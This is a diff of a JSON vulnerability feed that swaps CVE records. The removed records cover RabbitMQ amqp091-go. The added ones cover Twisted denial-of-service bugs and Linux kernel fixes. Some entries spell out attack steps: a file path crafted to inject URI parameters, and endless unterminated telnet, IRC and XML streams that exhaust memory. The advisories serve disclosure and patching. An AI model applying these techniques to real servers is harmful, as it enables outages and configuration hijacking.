-      "severity": "High",
-      "published": "2000-02-17",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securityfocus.com/templates/archive.pike?list=1&date=2000-02-15&msg=20000217160216.13708.qmail%40underground.org",
-        "http://www.securityfocus.com/templates/archive.pike?list=1&date=2000-02-15&msg=20000217160216.13708.qmail%40underground.org"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0155",
-      "summary": "Windows NT Autorun executes the autorun.inf file on non-removable media, which allows local attackers to specify an alternate program to execute when other users access a drive.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2000-02-18",
-      "modified": null,
-      "cwe": "CWE-94",
-      "references": [
-        "http://www.securityfocus.com/bid/993",
-        "http://www.securityfocus.com/templates/archive.pike?list=1&date=2000-02-15&msg=000701bf79cd%24fdb5a620%244c4342a6%40mightye.org",
-        "http://www.securityfocus.com/bid/993",
-        "http://www.securityfocus.com/templates/archive.pike?list=1&date=2000-02-15&msg=000701bf79cd%24fdb5a620%244c4342a6%40mightye.org"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-0612",
-      "summary": "Multiple buffer overflows in main.c for Crafty 19.3 allow local users to gain group \"games\" privileges via long command line arguments to crafty.bin.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "2004-03-29",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=203541",
-        "http://packages.debian.org/changelogs/pool/non-free/c/crafty/crafty_19.15-1/changelog.txt",
-        "http://secunia.com/advisories/9577/",
-        "http://securitytracker.com/id?1009393",
-        "http://securitytracker.com/id?1009398"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-1001",
-      "summary": "Cisco Cache Engine allows a remote attacker to gain access via a null username and password.",
-      "cvssScore": 2.6,
-      "severity": "Low",
-      "published": "1999-12-16",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-1001",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-1001"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-1004",
-      "summary": "Buffer overflow in the POP server POProxy for the Norton Anti-Virus protection NAV2000 program via a large USER command.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "1999-12-16",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://service1.symantec.com/SUPPORT/nav.nsf/df0a595864594c86852567ac0063608c/6206f660a1f2516a882568660082c930?OpenDocument&Highlight=0%2Cpoproxy",
-        "http://www.osvdb.org/6267",
-        "http://www.securityfocus.com/archive/1/38970",
-        "http://www.securityfocus.com/archive/1/39194",
-        "http://service1.symantec.com/SUPPORT/nav.nsf/df0a595864594c86852567ac0063608c/6206f660a1f2516a882568660082c930?OpenDocument&Highlight=0%2Cpoproxy"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-1005",
-      "summary": "Groupwise web server GWWEB.EXE allows remote attackers to read arbitrary files with .htm extensions via a .. (dot dot) attack using the HELP parameter.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "1999-12-19",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=94571433731824&w=2",
-        "http://www.osvdb.org/3413",
-        "http://www.securityfocus.com/bid/879",
-        "http://marc.info/?l=bugtraq&m=94571433731824&w=2",
-        "http://www.osvdb.org/3413"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0102",
-      "summary": "\"Multiple Users\" Control Panel in Mac OS 9 allows Normal users to gain Owner privileges by removing the Users & Groups Data File, which effectively removes the Owner password and allows the Normal user to log in as the Owner account without a password.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2001-02-12",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0497.html",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5830",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0497.html",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5830"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0095",
-      "summary": "catman in Solaris 2.7 and 2.8 allows local users to overwrite arbitrary files via a symlink attack on the sman_PID temporary file.",
-      "cvssScore": 1.2,
-      "severity": "Low",
-      "published": "2001-02-12",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0313.html",
-        "http://www.osvdb.org/6024",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5788",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0313.html",
-        "http://www.osvdb.org/6024"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0096",
-      "summary": "FrontPage Server Extensions (FPSE) in IIS 4.0 and 5.0 allows remote attackers to cause a denial of service via a malformed form, aka the \"Malformed Web Form Submission\" vulnerability.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2001-02-12",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-100",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5823",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-100",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5823"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-77405",
-      "summary": "## Summary\nA structural security weakness exists in the AMQP client's TLS configuration generator (`tlsConfigFromURI`). When constructing a `*tls.Config` object from an `amqps://` connection URI, the library initializes the structure without explicitly defining the `MinVersion` field. \n\nWhile modern versions of the Go compiler toolchain (Go 1.18+) default the implicit minimum version to TLS 1.2, this security posture relies entirely on an implicit toolchain dependency. If the library is compiled using legacy Go toolchains (Go < 1.18), or if a future toolchain introduces fallback behavior, the client could silently negotiate obsolete and insecure TLS 1.0 or TLS 1.1 protocols during connection handshakes with a compromised or malicious AMQP broker.\n\n## Vulnerability Details\n\n### Mechanism\nThe vulnerability lies in the lack of an explicit safety floor when assigning configurations inside the URI component:\n\n```go\n// Example within uri.go's tlsConfigFromURI\ncfg := &tls.Config{\n    ServerName: host,\n    // MinVersion is left completely unassigned (defaults to 0, or toolchain default)\n}\n```\n\nIn the Go standard library (`crypto/tls`), leaving `MinVersion: 0` instructs the runtime to choose the toolchain's default minimum. Prior to Go 1.18, this default allowed negotiation down to TLS 1.0. Relying on implicit compiler configurations violates secure coding practices by decoupling the library's security posture from its source code, leaving applications vulnerable based solely on how they are built.\n\n### Impact\nIf a client application is built with a legacy compiler environment or a custom Go runtime, an attacker capable of executing a Man-in-the-Middle (MitM) attack can force the connection to downgrade to TLS 1.0 or 1.1. This exposes the AMQP protocol data stream to well-known cryptographic vulnerabilities (such as BEAST, POODLE, or SWEET32), allowing the attacker to decrypt or alter message payloads, connection parameters, and authentication credentials.\n\n## Attack Vector\nAn attacker performing a network-level downgrade attack can intercept a client connection built under a legacy toolchain:\n\n1. **Interception:** A client application compiled on a legacy pipeline attempts to establish an encrypted connection to an AMQP broker.\n2. **Protocol Downgrade:** The attacker intercepts the TLS Client Hello handshake and forces a downgrade negotiation to TLS 1.0.\n3. **Cryptographic Exploitation:** Because `MinVersion` was never explicitly locked to `tls.VersionTLS12` by the library, the client accepts the weak cipher suites, allowing the attacker to monitor or manipulate the underlying AMQP session data.",
-      "cvssScore": 9.4,
-      "severity": "Critical",
-      "published": "2026-09-17",
-      "modified": "2026-09-17",
+      "published": "2026-10-23",
+      "modified": "2026-10-23",
       "cwe": {
-        "cwe_id": "CWE-316",
-        "name": "Cleartext Storage of Sensitive Information in Memory"
+        "cwe_id": "CWE-400",
+        "name": "Uncontrolled Resource Consumption"
       },
       "references": [
-        "https://github.com/rabbitmq/amqp091-go/security/advisories/GHSA-33mj-cw25-m34h",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-77405",
-        "https://github.com/rabbitmq/amqp091-go/pull/355",
-        "https://github.com/rabbitmq/amqp091-go/commit/c9fd433ecac2e557919e51acc9d809390c402c6e",
-        "https://github.com/rabbitmq/amqp091-go/releases/tag/v1.13.0"
+        "https://github.com/twisted/twisted/security/advisories/GHSA-2qrf-pqgx-qh9v",
+        "https://github.com/twisted/twisted/pull/12764",
+        "https://github.com/twisted/twisted/commit/3d125548bcbe955007cb97f480bb699a5e074741",
+        "https://github.com/twisted/twisted/releases/tag/twisted-26.10.0rc1",
+        "https://github.com/advisories/GHSA-2qrf-pqgx-qh9v"
       ],
       "vulnerableProducts": [
-        "github.com/rabbitmq/amqp091-go go"
+        "Twisted pip"
       ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-77404",
-      "summary": "## Summary\nA query parameter injection vulnerability exists in the AMQP client's connection URI formatting logic. When generating or parsing connection URIs, TLS-related filesystem paths (such as certificates or keys) are appended directly to the URI's query string using string concatenation rather than secure URL encoding via functions like `url.QueryEscape`.\n\nIf an application handles a TLS file path containing special character delimiters (such as `&` or `=`), these characters are interpreted as parameter separators by the URI parser. If the resulting `URI.String()` output is subsequently re-parsed via `ParseURI`, the injected fields can silently overwrite or hijack critical configuration parameters, forcing the client to use arbitrary connection settings or alternate TLS files.\n\n## Vulnerability Details\n\n### Mechanism\nThe vulnerability lies within the lack of proper escaping when compiling connection string components into a raw URL format:\n\n```go\n// Example of insecure string concatenation during URI building\nuri := fmt.Sprintf(\"amqps://user:pass@host/%s?certfile=%s&keyfile=%s\", vhost, certPath, keyPath)\n```\n\nBecause `certPath` and `keyPath` are not passed through `url.QueryEscape`, special URL characters preserve their control meanings. For instance, if a user supply a certificate path named:\n`/tmp/cert=foo&keyfile=/evil/path`\n\nThe generated string translates into:\n`...?certfile=/tmp/cert=foo&keyfile=/evil/path&keyfile=/original/path`\n\nWhen this string passes back through `ParseURI` (common in connection re-dial routines or configuration replication steps), standard URL parsing mechanics treat the string as multiple distinct parameters. Depending on map assignment order inside the parser, the injected keys take precedence over the original parameters.\n\n### Impact\nBy manipulating the file paths used for TLS assets, an attacker or compromised local sub-system can:\n* Inject arbitrary alternative options or override protocol settings.\n* Substitute or switch keyfiles, leading to connection failures or the parsing of unauthorized cryptographic assets.\n* Corrupt connection state variables, triggering application-layer failures during connection setup or recovery.\n\n## Attack Vector\nAn attacker who has partial control over directory naming conventions or environmental variables used to specify local infrastructure paths can execute a parameter injection attack:\n\n1. **Path Creation:** An attacker sets up a path containing deliberate URL parameter delimiters (e.g., `/var/lib/certs/client.crt?cacertfile=/tmp/fake_ca.crt&`).\n2. **String Generation:** The application serializes the active connection state or passes the paths down to an unescaped URI builder function.\n3. **Configuration Hijack:** The URI string is generated with the injected parameter embedded into the query structure. When the client attempts to reuse or re-parse this connection string during a connection retry or worker spin-up, it parses the injected `cacertfile` parameter, loading a different, unverified Certificate Authority string.",
+      "id": "CVE-2026-115776",
+      "summary": "## Summary\n\nAn unbounded-buffer vulnerability (CWE-770) in the Twisted words IRC server lets any unauthenticated remote client exhaust server memory. `twisted.words.protocols.irc.IRC.dataReceived` appends every received byte to a per-connection buffer and only removes data at a line feed, with no maximum length. Because `IRC` is a plain `Protocol` and not a `LineReceiver`, one connection that streams bytes without a line feed grows the buffer without bound and drives the whole single-threaded process to out-of-memory, dropping every user at once. The `twistd words` server inherits the method unchanged through `IRCUser`, and the data is buffered before any authentication.\n\n## Details\n\n`IRC.dataReceived` keeps everything up to the last line feed in `self.buffer`:\n\n```python\n# twisted/words/protocols/irc.py\nclass IRC(protocol.Protocol):        # not a LineReceiver, so no MAX_LENGTH\n    buffer = \"\"\n    def dataReceived(self, data):\n        if isinstance(data, bytes):\n            data = data.decode(\"utf-8\")\n        lines = (self.buffer + data).split(LF)\n        self.buffer = lines.pop()    # no 3line feed -> whole input stays buffered\n        ...\n```\n\nWith no line feed in the data, `lines.pop()` returns the entire accumulated content to `self.buffer`, so it grows by every chunk and is never bounded; `IRC` defines no `MAX_LENGTH`, no `lineLengthExceeded`, and no timeout, so the connection is never closed. The `twistd words` server protocol `IRCUser` subclasses `IRC` without overriding `dataReceived`, and the buffer is filled before any `PASS`, `NICK`, or `USER`, so no credentials are required.\n\nAffected product: Twisted (`twisted.words`), `twisted.words.protocols.irc.IRC` and its subclass `twisted.words.service.IRCUser`\nAffected versions: 26.4.0 and earlier\n\n## PoC\n\nOn a standard Twisted words IRC server (the server `twistd words` runs, using `IRCUser`), an unauthenticated client opens a single TCP connection and continuously sends data that contains no line feed, never completing a line. Every chunk is appended to the connection's line buffer, and because no complete line is ever formed none of it is consumed, so the buffer grows by the full volume sent.\n\nIn a measured run against a real `IRCFactory` server, one unauthenticated connection sending 60 MB of line-feed-free data raised the server process resident memory from about 47 MB to 2966 MB (roughly 49 MB per MB sent) with the connection still open and no limit triggered. Sending the same volume as normal line-feed-terminated commands leaves memory flat, which isolates the cause to the missing line-length bound.\n\n## Impact\n\nAn unauthenticated remote denial of service from allocation without limits (CWE-770) leading to uncontrolled resource consumption (CWE-400). A single credential-free connection exhausts the memory of the whole `twistd words` process, and because one process serves every user, the crash drops all connections at once and the service stays down until it is restarted. The quadratic buffer copy reaches the same effect faster. There is no confidentiality or integrity impact and no code execution.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2026-10-23",
+      "modified": "2026-10-23",
+      "cwe": {
+        "cwe_id": "CWE-400",
+        "name": "Uncontrolled Resource Consumption"
+      },
+      "references": [
+        "https://github.com/twisted/twisted/security/advisories/GHSA-53xc-49m8-p798",
+        "https://github.com/twisted/twisted/pull/12771",
+        "https://github.com/twisted/twisted/commit/01f8cff7753c1edac132380b2ea939fa6bdbab30",
+        "https://github.com/twisted/twisted/commit/ac90fb7b0ab73688a581fcd9a7c0577ec8ca3059",
+        "https://github.com/twisted/twisted/releases/tag/twisted-26.10.0rc1"
+      ],
+      "vulnerableProducts": [
+        "Twisted pip"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-115778",
+      "summary": "## Summary\n\nAn allocation-without-limits vulnerability (CWE-770) in the Twisted conch telnet transport lets any unauthenticated remote peer exhaust server memory over a single connection. When the peer opens a telnet subnegotiation with `IAC SB` and then streams bytes without ever sending the `IAC SE` terminator, every byte is appended to a per-connection buffer that has no maximum length. The buffer persists across reads and is released only on the terminator the attacker withholds, so it grows without bound until the process is killed.\n\n## Details\n\nThe option-negotiation state machine in `Telnet.dataReceived` enters the `subnegotiation` state on `IAC SB` and sets an empty command list. In that state every non-`IAC` byte is appended to the list with no length check:\n\n```python\n# src/twisted/conch/telnet.py  (Telnet.dataReceived)\nelif self.state == \"subnegotiation\":\n    if b == IAC:\n        self.state = \"subnegotiation-escaped\"\n    else:\n        self.commands.append(b)      # unbounded: no len(self.commands) check\n```\n\n`self.commands` is an instance attribute that persists across `dataReceived` calls and is deleted only when `IAC SE` completes the subnegotiation. Negotiation runs at the transport layer before authentication, and the bytes are consumed inside `dataReceived` before any application callback, so an application cannot impose a bound. Twisted caps other parser buffers, for example `NetstringReceiver.MAX_LENGTH`, but not this one.\n\nAffected product: Twisted, `twisted.conch.telnet` transport\nAffected versions: confirmed against 26.4.0\n\n## PoC\n\nOn any endpoint that exposes the Twisted telnet transport, such as the Twisted manhole telnet service, open one connection and send the two bytes `IAC SB` (`0xFF 0xFA`), then stream any non-`0xFF` bytes continuously and never send the `IAC SE` terminator (`0xFF 0xF0`). No credentials are required, because option negotiation runs before authentication.\n\nEvery byte is appended to the per-connection subnegotiation buffer with no maximum, and the buffer is released only by the terminator the attacker withholds, so it grows for the life of the connection. Because each byte is retained as a separate element the memory consumed is several times the traffic sent, so a modest-bandwidth peer, or several such connections, drives the process to memory exhaustion.\n\n## Impact\n\nThis is an unauthenticated remote denial of service (CWE-770, CWE-400) by memory exhaustion. A single connection grows an in-memory buffer without bound at a cost proportional to the bytes sent, amplified by per-byte object overhead, until the operating system kills the server and every service it hosts. There is no confidentiality or integrity impact and no code execution. The affected surface is any deployment that exposes a Twisted telnet or manhole transport to untrusted peers.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2026-10-23",
+      "modified": "2026-10-23",
+      "cwe": {
+        "cwe_id": "CWE-400",
+        "name": "Uncontrolled Resource Consumption"
+      },
+      "references": [
+        "https://github.com/twisted/twisted/security/advisories/GHSA-cwm5-jh59-mwxr",
+        "https://github.com/twisted/twisted/pull/12750",
+        "https://github.com/twisted/twisted/commit/073ba878c6c07d569cb61abc5ae76d46eff1b529",
+        "https://github.com/twisted/twisted/commit/5d91cc66a3591faba758a80a1479e0103602facc",
+        "https://github.com/twisted/twisted/releases/tag/twisted-26.10.0rc1"
+      ],
+      "vulnerableProducts": [
+        "Twisted pip"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-115775",
+      "summary": "## Summary\n\nAn allocation-without-limits vulnerability in the Twisted XML element stream lets any unauthenticated remote peer exhaust server memory over a single stream. When the peer opens a container element and streams child elements without ever closing the container, every element is materialised into an in-memory tree with no limit on depth or child count. An element is released only when its end tag arrives, so a container the attacker never closes retains everything beneath it until the process is killed.\n\n## Details\n\nIn `ExpatElementStream._onStartElement`, each start tag appends a new element to the current element's children and descends into it, with no depth or child-count check:\n\n```python\n# src/twisted/words/xish/domish.py  (ExpatElementStream._onStartElement)\nif self.documentStarted == 1:\n    if self.currElem != None:\n        self.currElem.children.append(e)   # append child: no depth/count cap\n        e.parent = self.currElem\n    self.currElem = e                      # descend into the new element\n```\n\nAn element is emitted and dropped only when its end tag arrives while it sits directly under the document root, so a container that is never closed keeps every child beneath it. The transport `XmlStream.dataReceived` feeds bytes to `self.stream.parse(data)` with no size limit, and in XMPP the stream is parsed during negotiation before authentication.\n\nAffected product: Twisted, `twisted.words.xish.domish` element stream\nAffected versions: confirmed against 26.4.0\n\n## PoC\n\nOn any endpoint that parses untrusted XML streams with this stack, such as an XMPP server, open a stream by sending the opening `stream:stream` tag and a container element, then stream child elements continuously and never send the container's closing tag. No credentials are required, because in XMPP the stream is parsed before authentication.\n\nEvery child is appended to the container and retained because the container is never emitted, and the transport applies no limit on the size of the unfinished document. Because each small element becomes a full object in memory the footprint is many times the traffic sent, so a modest-bandwidth peer, or several such streams, drives the process to memory exhaustion.\n\n## Impact\n\nThis is an unauthenticated remote denial of service by memory exhaustion. A single stream grows an in-memory element tree without bound, amplified by per-element object overhead, until the operating system kills the server. There is no confidentiality or integrity impact and no code execution. The affected surface is any deployment that parses untrusted XML streams with this stack, such as an XMPP server or component.",
       "cvssScore": 8.7,
       "severity": "High",
-      "published": "2026-09-17",
-      "modified": "2026-09-17",
+      "published": "2026-10-23",
+      "modified": "2026-10-23",
       "cwe": {
-        "cwe_id": "CWE-116",
-        "name": "Improper Encoding or Escaping of Output"
+        "cwe_id": "CWE-400",
+        "name": "Uncontrolled Resource Consumption"
       },
       "references": [
-        "https://github.com/rabbitmq/amqp091-go/security/advisories/GHSA-465g-fh3v-9jw4",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-77404",
-        "https://github.com/rabbitmq/amqp091-go/pull/352",
-        "https://github.com/rabbitmq/amqp091-go/commit/743d488e46955fe7ffc55506fe2c401d01216783",
-        "https://github.com/rabbitmq/amqp091-go/releases/tag/v1.13.0"
+        "https://github.com/twisted/twisted/security/advisories/GHSA-3476-c5c2-fr73",
+        "https://github.com/twisted/twisted/pull/12751",
+        "https://github.com/twisted/twisted/commit/8873814bec8288e2466fad4d2c4d64039beb88b0",
+        "https://github.com/twisted/twisted/releases/tag/twisted-26.10.0rc1",
+        "https://github.com/advisories/GHSA-3476-c5c2-fr73"
       ],
       "vulnerableProducts": [
-        "github.com/rabbitmq/amqp091-go go"
+        "Twisted pip"
       ],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-2294",
-      "summary": "Multiple buffer overflows in Symantec Raptor Firewall 6.5 and 6.5.3, Enterprise Firewall 6.5.2 and 7.0, VelociRaptor 500/700/1000 and 1100/1200/1300, and Gateway Security 5110/5200/5300 allow remote attackers to cause a denial of service (service termination) via (1) malformed RealAudio (rad) packets that are not properly handled by the RealAudio Proxy, or (2) crafted packets to the statistics service (statsd).",
+      "id": "CVE-1999-1120",
+      "summary": "netprint in SGI IRIX 6.4 and earlier trusts the PATH environmental variable for finding and executing the disable program, which allows local users to gain privileges.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "1997-01-04",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://patches.sgi.com/support/free/security/advisories/19961203-01-PX",
+        "ftp://patches.sgi.com/support/free/security/advisories/19961203-02-PX",
+        "http://marc.info/?l=bugtraq&m=87602167420403&w=2",
+        "http://www.osvdb.org/993",
+        "http://www.securityfocus.com/bid/395"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-99251",
+      "summary": "In the Linux kernel, the following vulnerability has been resolved:\n\nDrivers: hv: Avoid infinite retry loop in init_vp_index()\n\nThere is a retry loop in init_vp_index() where the CPUs from a certain\nnode are stripped out if they have already been in the allocated cpumask\nor not in HK_TYPE_MANAGED_IRQ housekeeping cpumask. If there is no\nCPU left, the allocated cpumask is ignored and the process is retried\nagain. However, if the HK_TYPE_MANAGED_IRQ housekeeping cpumask turns\nout not to contain any CPU in that particular node, that will become an\ninfinite retry loop.  This particular problem was reported by sashiko\n[1]. This should rarely happen, but we still need to guard against this.\n\nFix this infinite loop problem by also skipping NUMA node that has no\nhousekeeping CPU in the inner while loop of init_vp_index(). Also update\nthe early abort check to check for the absence of online housekeeping\nCPUs instead of just the emptiness of the cpumask. As the outer for\nloop will only be reached if the housekeeping cpumask has at least one\nonline CPU, a NUMA node with housekeeping CPUs will eventually be found.",
+      "cvssScore": null,
+      "severity": "Unknown",
+      "published": "2026-11-03",
+      "modified": "2026-11-03",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-99251",
+        "https://git.kernel.org/stable/c/15dd3429f0e76ca071657e480cb7e6ff3a1af730",
+        "https://git.kernel.org/stable/c/32ea0a33e3a0fb7c10c601b43e1b2f6c06a3f5fd",
+        "https://git.kernel.org/stable/c/7141331f2d245efc07175802a6bf76badec871ed",
+        "https://git.kernel.org/stable/c/95fec47cdbf747b81ab22affd7252dda6050ad0c"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-99249",
+      "summary": "In the Linux kernel, the following vulnerability has been resolved:\n\npid_namespace: make zap_pid_ns_processes() freezable\n\nWhen the init of a pid namespace exits, zap_pid_ns_processes() waits\nuntil all other pids in the namespace are freed. A tracer outside the\nnamespace that does not reap its traced zombies keeps those pids\nallocated, so this wait has no upper bound, and while it lasts every\nsuspend attempt fails:\n\n  Freezing user space processes failed after 20.006 seconds (2 tasks refusing to freeze, wq_busy=0):\n\nNeither wait is freezable. The first loop sleeps in do_wait(), which\nreturns -ERESTARTSYS on the freezer's fake signal; the loop then clears\nTIF_SIGPENDING and waits again without ever freezing. The final loop\nsleeps in TASK_INTERRUPTIBLE, and since nothing clears TIF_SIGPENDING\nthere, schedule() returns immediately after the first freeze attempt\nand the task spins until the wait ends.\n\nSleep in TASK_INTERRUPTIBLE | TASK_FREEZABLE in do_wait(), so that the\nfreezer can freeze tasks waiting there directly, and in TASK_IDLE |\nTASK_FREEZABLE in the final loop, like coredump_task_exit() does.\n\nThis was hit with Chromium-based browsers: crashpad ptrace-attaches the\nthreads of a crashed renderer, which is a pid namespace init, and does\nnot reap those killed during the dump.",
+      "cvssScore": null,
+      "severity": "Unknown",
+      "published": "2026-11-03",
+      "modified": "2026-11-03",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-99249",
+        "https://git.kernel.org/stable/c/064a6761d6f6ac55d090d3eaca649577ee736713",
+        "https://git.kernel.org/stable/c/2e10b8a74f55b5aae33db105d3e2d3ae759c865a",
+        "https://git.kernel.org/stable/c/4b47107f1a80c809c80093e872bcaccdbae13db4",
+        "https://git.kernel.org/stable/c/7deb5770840339fe88755bf27b92f74edc26ee87"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-99254",
+      "summary": "In the Linux kernel, the following vulnerability has been resolved:\n\nio_uring: don't flood a cancelling task with task_work\n\nio_ring_exit_work() asks each task which has used the ring to remove its\ntctx node, by task_work, and repeats that until the list is empty.\nio_tctx_exit_cb() doesn't touch the node while the task is in\nio_uring_cancel_generic(), which removes all the nodes at its end. So the\nwork item queues the callback again as soon as it has completed, for\nnothing.\n\nThat is more than a waste of time. task_work_run() only returns when it\nfinds the list empty. If the rings are released from inside the\ncancellation, because requests of other rings held the last references to\ntheir files, up to 64 work items keep sending callbacks to the one task\nwhich is running them. It never finds the list empty, never gets back to\nthe cancellation, the nodes stay, and so it goes on: a task with 60 pairs\nof rings which poll each other ran 280000 callbacks in 5 seconds, 20\nseconds after exit_group(). It ends when all the senders happen to be late\nat the same time. Until then the task keeps a CPU and the work items busy.\n\nAn exiting task can't be killed meanwhile. execve() cancels the requests in\nthe same way, so a live task can get stuck there as well, for minutes. If\nit takes more than five, the work items run into the\nWARN_ON_ONCE(time_after(jiffies, timeout)) of io_ring_exit_work(). No\nprivilege is needed for any of this.\n\nIf the callback has met a task in cancellation, wait a little before it is\nsent again. Nobody has to wake the work item up for that: either the node\nis gone by then, or it is the turn of the next round.",
+      "cvssScore": null,
+      "severity": "Unknown",
+      "published": "2026-11-03",
+      "modified": "2026-11-03",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-99254",
+        "https://git.kernel.org/stable/c/14f56e9c0b8fdc2e178acdbec9781e90ef46f7e9",
+        "https://git.kernel.org/stable/c/2c75ebae8a7f09c99e31c7042b7d4d595f03b2b1",
+        "https://git.kernel.org/stable/c/61c761fc21e00e45c33c2bb596be442d92fb8792",
+        "https://git.kernel.org/stable/c/a22fb44e988b01b82235ea07f0bf0fc73e256596"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-89725",
+      "summary": "In the Linux kernel, the following vulnerability has been resolved:\n\nmedia: cec: stm32: prevent out-of-bounds write on RX overflow\n\nstm32_rx_done() appends each received CEC byte to rx_msg.msg[] using\nrx_msg.len as the write index, incrementing it on every RXBR\n(receive-byte-ready) interrupt without checking it against the buffer\nsize:\n\n\tcec->rx_msg.msg[cec->rx_msg.len++] = val & 0xFF;\n\nrx_msg.msg[] is a fixed CEC_MAX_MSG_SIZE (16) byte array in struct\ncec_msg, and rx_msg.len is only reset on RXACKE/RXOVR or after a\ncompleted message (RXEND). The number of bytes received before RXEND is\ndecided by the remote CEC device (it sets EOM), not by the driver. A\npeer that keeps sending bytes without ending the message drives RXBR\nrepeatedly, pushing rx_msg.len past 16 and writing peer-controlled bytes\nout of bounds into the surrounding memory. This is reachable in normal\noperation once the driver has probed and receiving is enabled, from the\nIRQ thread, without any local privilege.\n\nThe length check in the CEC core runs on the consumer side, after the\nbyte has been stored, so it does not prevent the overflow. Bound the\nindex in the driver before the store, as the other platform CEC drivers\nalready do (e.g. tegra_cec), dropping the excess bytes of an overlong\nframe.\n\nFound by static analysis tool CodeQL.",
+      "cvssScore": 7.1,
+      "severity": "High",
+      "published": "2026-09-11",
+      "modified": "2026-09-13",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-89725",
+        "https://git.kernel.org/stable/c/0c260d3f97e52978a8c769bb095ac0901333a3ac",
+        "https://git.kernel.org/stable/c/a85ce3b175615c2e13bc01e8a1b6b6b6910fde57",
+        "https://git.kernel.org/stable/c/c3edd7fb8e3692423a702705509947fc9c30b3d1",
+        "https://git.kernel.org/stable/c/fb9dda38d4b9e90db07ed9a0ee2d35bf85494035"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-89747",
+      "summary": "In the Linux kernel, the following vulnerability has been resolved:\n\ntracing: Fix use-after-free in trace_pipe read on sub-buffer order change\n\nWriting to buffer_subbuf_size_kb calls ring_buffer_subbuf_order_set(),\nwhich frees every sub-buffer of the ring buffer, including the reader\npage, and replaces them with newly allocated ones.\n\nReaders of trace_pipe hold pointers into those pages. ring_buffer_peek()\nlooks up an event under cpu_buffer->reader_lock but returns the event\npointer after dropping the lock, and peek_next_entry() then calls\nring_buffer_event_length() and ring_buffer_event_data() on it. If the\nsub-buffer order is changed in that window, the reader dereferences\nfreed memory:\n\n  BUG: KASAN: use-after-free in ring_buffer_peek+0x3e0/0x430\n  Read of size 1 at addr ffff88802a4cf010 by task syz-executor989/6002\n\n  Freed by:\n   free_buffer_page kernel/trace/ring_buffer.c:398 [inline]\n   ring_buffer_subbuf_order_set+0x1325/0x18e0 kernel/trace/ring_buffer.c:7444\n   buffer_subbuf_size_write+0x182/0x280 kernel/trace/trace.c:8221\n\nTake trace_access_lock(RING_BUFFER_ALL_CPUS) around the order change.\nThis is the lock trace_pipe readers already hold across their entire\npeek-and-print loop, so the swap can no longer race with a reader that\nis dereferencing a peeked event.",
+      "cvssScore": 6.1,
+      "severity": "Medium",
+      "published": "2026-09-11",
+      "modified": "2026-09-13",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-89747",
